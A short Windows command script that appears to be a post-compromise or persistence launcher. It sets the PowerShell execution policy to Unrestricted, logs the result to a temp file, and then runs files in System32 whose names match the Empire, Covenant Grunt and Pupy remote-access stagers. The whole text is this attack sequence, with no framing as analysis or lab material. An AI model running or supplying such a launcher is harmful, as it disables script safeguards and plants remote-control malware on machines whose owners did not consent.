PowerShell -Command "Set-ExecutionPolicy Unrestricted" >> "%TEMP%\StartupLog.txt" 2>&1
PowerShell "C:\Windows\System32\empire.bat"
PowerShell "C:\Windows\System32\GruntStager.ps1"
PowerShell "C:\Windows\System32\pupy_windows.exe"